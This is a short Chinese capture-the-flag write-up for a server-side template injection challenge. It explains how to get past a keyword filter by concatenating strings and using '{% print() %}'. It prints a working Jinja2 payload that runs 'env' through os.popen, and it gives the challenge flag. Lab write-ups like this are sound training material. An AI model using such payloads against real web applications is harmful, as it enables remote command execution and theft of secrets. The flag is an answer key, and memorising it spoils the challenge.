# Web-21｜第二十一章 往生漩涡·言灵死局

## 碎碎念

SSTI 2.0
***
## Writeup

相比上一道题，这道题 ban 掉了 `["__", "global", "{{", "}}"]`，因此上一道题提供的所有都不可行，但是我们可以通过一些手段绕过：

1. 对于 `{{` 和 `}}`，可以用 `{% print() %}` 代替绕过
2. 对于 `__` 和 `global`，可以通过拼接绕过

我使用的是 `{% print(lipsum['_''_glo''bals_''_']['os'].popen('env').read()) %}`，得到 flag：

![](../../../../assets/Pasted%20image%2020251029203827.png)

最终 flag：`moectf{bf38bf3b-96d9-9720-c013-64be1b7cea2b}`